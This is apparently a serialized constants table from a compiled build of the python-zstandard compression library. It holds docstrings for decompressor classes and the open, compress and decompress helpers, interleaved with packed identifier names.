    >>> with dctx.stream_writer(fh, write_size=16384) as decompressor:
    >>>    pass

    You can see how much memory is being used by the decompressor:

    >>> dctx = zstandard.ZstdDecompressor()
    >>> with dctx.stream_writer(fh) as decompressor:
    >>>    byte_size = decompressor.memory_size()

    ``stream_writer()`` accepts a ``write_return_read`` boolean argument to control
    the return value of ``write()``. When ``True`` (the default)``, ``write()``
    returns the number of bytes that were read from the input. When ``False``,
    ``write()`` returns the number of bytes that were ``write()`` to the inner
    stream.
    uZstdDecompressionWriter.__init__uZstdDecompressionWriter.__enter__uZstdDecompressionWriter.__exit__uZstdDecompressionWriter.__iter__uZstdDecompressionWriter.__next__uZstdDecompressionWriter.memory_sizeuZstdDecompressionWriter.closeuZstdDecompressionWriter.closeduZstdDecompressionWriter.filenouZstdDecompressionWriter.flushuZstdDecompressionWriter.isattyuZstdDecompressionWriter.readableuZstdDecompressionWriter.readlineuZstdDecompressionWriter.readlinesuZstdDecompressionWriter.seekuZstdDecompressionWriter.seekableuZstdDecompressionWriter.telluZstdDecompressionWriter.truncateuZstdDecompressionWriter.writableuZstdDecompressionWriter.writelinesuZstdDecompressionWriter.readuZstdDecompressionWriter.readalluZstdDecompressionWriter.readintouZstdDecompressionWriter.writeaZstdDecompressoru
    Context for performing zstandard decompression.

    Each instance is essentially a wrapper around a ``ZSTD_DCtx`` from zstd's
    C API.

    An instance can compress data various ways. Instances can be used multiple
    times.

    The interface of this class is very similar to
    :py:class:`zstandard.ZstdCompressor` (by design).

    Assume that each ``ZstdDecompressor`` instance can only handle a single
    logical compression operation at the same time. i.e. if you call a method
    like ``decompressobj()`` to obtain multiple objects derived from the same
    ``ZstdDecompressor`` instance and attempt to use them simultaneously, errors
    will likely occur.

    If you need to perform multiple logical decompression operations and you
    can't guarantee those operations are temporally non-overlapping, you need
    to obtain multiple ``ZstdDecompressor`` instances.

    Unless specified otherwise, assume that no two methods of
    ``ZstdDecompressor`` instances can be called from multiple Python
    threads simultaneously. In other words, assume instances are not thread safe
    unless stated otherwise.

    :param dict_data:
       Compression dictionary to use.
    :param max_window_size:
       Sets an upper limit on the window size for decompression operations in
       kibibytes. This setting can be used to prevent large memory allocations
       for inputs using large compression windows.
    :param format:
       Set the format of data for the decoder.

       By default this is ``zstandard.FORMAT_ZSTD1``. It can be set to
       ``zstandard.FORMAT_ZSTD1_MAGICLESS`` to allow decoding frames without
       the 4 byte magic header. Not all decompression APIs support this mode.
    uZstdDecompressor.__init__uZstdDecompressor.memory_sizeTlFtuZstdDecompressor.decompressuZstdDecompressor.stream_readeradecompressobjuZstdDecompressor.decompressobjuZstdDecompressor.stream_writeruZstdDecompressor.copy_streamadecompress_content_dict_chainuZstdDecompressor.decompress_content_dict_chainTnlamulti_decompress_to_bufferuZstdDecompressor.multi_decompress_to_bufferuZstdDecompressor._ensure_dctxuzstandard\backend_cffi.pyu<module zstandard.backend_cffi>Ta__class__TaselfTaselfaexc_typeaexc_valueaexc_tbTaselfwiTaselfafparamsTaselfacompressorachunk_sizeTaselfadataadict_typewkwdTaselfacompressorawrite_sizeTaselfaformatacompression_levelawindow_logahash_logachain_logasearch_logamin_matchatarget_lengthastrategyawrite_content_sizeawrite_checksumawrite_dict_idajob_sizeaoverlap_logaforce_max_windowaenable_ldmaldm_hash_logaldm_min_matchaldm_bucket_size_logaldm_hash_rate_logathreadsaparamsTaselfacompressorasourcearead_sizeaclosefdTaselfacompressorawriterasource_sizeawrite_sizeawrite_return_readaclosefdazresultT
aselfaleveladict_dataacompression_paramsawrite_checksumawrite_content_sizeawrite_dict_idathreadsaparamsacctxTaselfadecompressorawrite_sizearead_across_framesTaselfadecompressorasourcearead_sizearead_across_framesaclosefdTaselfadecompressorawriterawrite_sizeawrite_return_readaclosefdTaselfadict_dataamax_window_sizeaformatadctxTaselfaout_bufferaold_posazresultTaselfaddictTaselfaout_bufferazresultTaselfaload_dictazresultTaparamsaparamaresultazresultTaparamsaresaattrsaparamavalueTaselfadataTaparamsaparamavalueazresultTaselfazresultadict_dataTazresultTaselfasizeachunk_sizeazresultTaselfwfTaselfadataadata_bufferazresultTaselfadataadata_bufferasourceachunksazresultTaselfadataadata_bufferadest_sizeaoutazresultaout_bufferain_bufferTaselfasizeazresultacobjTaselfaifhaofhasizearead_sizeawrite_sizeazresultain_bufferaout_bufferadst_bufferatotal_readatotal_writeadataadata_bufferT
aselfaifhaofharead_sizeawrite_sizeain_bufferaout_bufferadst_bufferatotal_readatotal_writeadataadata_bufferazresultTaselfadataain_bufferaout_bufferadata_bufferadst_bufferachunksazresultT
aselfadataamax_output_sizearead_across_framesaallow_extra_dataadata_bufferaoutput_sizearesult_bufferaresult_sizeaout_bufferain_bufferazresultacountTaselfaframesachunkachunk_bufferaparamsazresultalast_bufferaout_bufferain_bufferwiadest_bufferTaselfawrite_sizearead_across_framesTaselfazresultTaselfaflush_modeaz_flush_modeain_bufferachunksazresultTaselfaflush_modeaflushatotal_writeaout_bufferain_bufferazresultwfTaselfalengthTadataadata_bufferasizeTadataadata_bufferazresultTaselfaprogressionTalevelasource_sizeadict_sizeakwargsaparamsaargsaargaattrTadataaparamsadata_bufferazresultTaselfadataathreadsTaselfaframesadecompressed_sizesathreadsTaselfalevelacompression_paramsacparamsacdictTaselfasizeadst_bufferaout_bufferaold_posazresultTaselfasizeTaselfasizeadst_bufferaout_bufferTaselfareaderasizearead_sizeawrite_sizeahave_readabuffer_offsetazresultain_bufferaout_bufferadst_bufferaread_resultaremainingaslice_sizearead_bufferadataTaselfareaderaread_sizeawrite_sizeaskip_bytesahave_readabuffer_offsetasizeain_bufferaout_bufferadst_bufferaread_resultaremainingaslice_sizearead_bufferazresultadataTaselfachunksachunkTaselfwbadest_bufferaout_bufferaold_posazresultTaselfwbTaselfwbadest_bufferaout_bufferTaselfahintTaselfaoffsetawhenceTaselfaposawhencearead_amountaresultTaselfasourceasizearead_sizeaclosefdazresultTaselfasourcearead_sizearead_across_framesaclosefdTaselfawriterasizeawrite_sizeawrite_return_readaclosefdTaselfawriterawrite_sizeawrite_return_readaclosefdTadict_sizeasampleswkwdwfasplit_pointaaccelanotificationsadict_idalevelastepsathreadsatotal_sizeasamples_bufferasample_sizesaoffsetwiasamplewladict_dataadparamsazresultamsgTaselfadataatotal_writeadata_bufferain_bufferaout_bufferazresultTaselfadataatotal_writeain_bufferaout_bufferadata_bufferadst_bufferadctxazresultTaselfaignoredTaselfalinesu.zstandarddareplaceTwtuTwrarbaZstdDecompressorwrarbTwwawbwaaabwxaxbaZstdCompressorwwaendswithTwbwbaValueErroruInvalid mode: {!r}ahasattraPathLikeastrabytesaisinstancearaw_open_modeareadawriteaboolaTypeErrorTufilename must be a str, bytes, file or PathLike objectastream_readerTaclosefdastream_writeraRuntimeErrorTulogic error in zstandard.open() handling open modeaTextIOWrapperTaencodingaerrorsanewlineuCreate a file object with zstd (de)compression.

    The object returned from this function will be a
    :py:class:`ZstdDecompressionReader` if opened for reading in binary mode,
    a :py:class:`ZstdCompressionWriter` if opened for writing in binary mode,
    or an ``io.TextIOWrapper`` if opened for reading or writing in text mode.

    :param filename:
       ``bytes``, ``str``, or ``os.PathLike`` defining a file to open or a
       file object (with a ``read()`` or ``write()`` method).
    :param mode:
       ``str`` File open mode. Accepts any of the open modes recognized by
       ``open()``.
    :param cctx:
       ``ZstdCompressor`` to use for compression. If not specified and file
       is opened for writing, the default ``ZstdCompressor`` will be used.
    :param dctx:
       ``ZstdDecompressor`` to use for decompression. If not specified and file
       is opened for reading, the default ``ZstdDecompressor`` will be used.
    :param encoding:
        ``str`` that defines text encoding to use when file is opened in text
        mode.
    :param errors:
       ``str`` defining text encoding error handling mode.
    :param newline:
       ``str`` defining newline to use in text mode.
    :param closefd:
       ``bool`` whether to close the file when the returned object is closed.
        Only used if a file object is passed. If a filename is specified, the
        opened file is always closed when the returned object is closed.
    TalevelacompressuCompress source data using the zstd compression format.

    This performs one-shot compression using basic/default compression
    settings.

    This method is provided for convenience and is equivalent to calling
    ``ZstdCompressor(level=level).compress(data)``.

    If you find yourself calling this function in a tight loop,
    performance will be greater if you construct a single ``ZstdCompressor``
    and repeatedly call ``compress()`` on it.
    adecompressTamax_output_sizeuDecompress a zstd frame into its original data.

    This performs one-shot decompression using basic/default compression
    settings.

    This method is provided for convenience and is equivalent to calling
    ``ZstdDecompressor().decompress(data, max_output_size=max_output_size)``.

    If you find yourself calling this function in a tight loop, performance
    will be greater if you construct a single ``ZstdDecompressor`` and
    repeatedly call ``decompress()`` on it.
    uPython interface to the Zstandard (zstd) compression library.a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_zstandardu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aabsolute_importaunicode_literalsabuiltinsaioaosaplatformlaByteStringTaPYTHON_ZSTANDARD_IMPORT_POLICYadefaulta_module_policyadefaultapython_implementationTaCPythonabackend_cTw*lacextabackendTaPyPyabackend_cffiacffiaImportErroracffi_fallbackarustabackend_rustuunknown module import policy: %s; use default, cffi_fallback, cext, or cffiu0.23.0a__version__a_MODE_CLOSEDa_MODE_READla_MODE_WRITETarbnnnnnnaopenTladataalevelaintareturnTlamax_output_sizeuzstandard\__init__.pyu<module zstandard>TadataalevelacctxTadataamax_output_sizeadctxTafilenameamodeacctxadctxaencodingaerrorsanewlineaclosefdanormalized_modeaopen_modearaw_open_modeatypesainner_fhafhu.
